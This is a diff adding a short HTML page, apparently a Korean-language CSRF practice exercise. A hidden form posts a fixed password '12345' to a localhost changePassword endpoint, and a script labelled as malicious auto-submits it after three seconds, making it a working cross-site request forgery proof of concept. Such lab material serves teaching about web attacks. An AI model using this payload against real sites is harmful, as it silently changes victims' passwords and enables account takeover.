@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>5-2</title>
+  </head>
+  <body>
+    <h3>2. CSRF 실습</h3>
+    <form id="form" action="http://localhost:8282/changePassword" method="POST">
+      <input type="hidden" name="password" value="12345" />
+    </form>
+
+    <!-- 악성스크립트 -->
+    <script>
+      setTimeout(() => {
+        document.getElementById("form").submit();
+      }, 3000);
+    </script>
+  </body>
+</html>
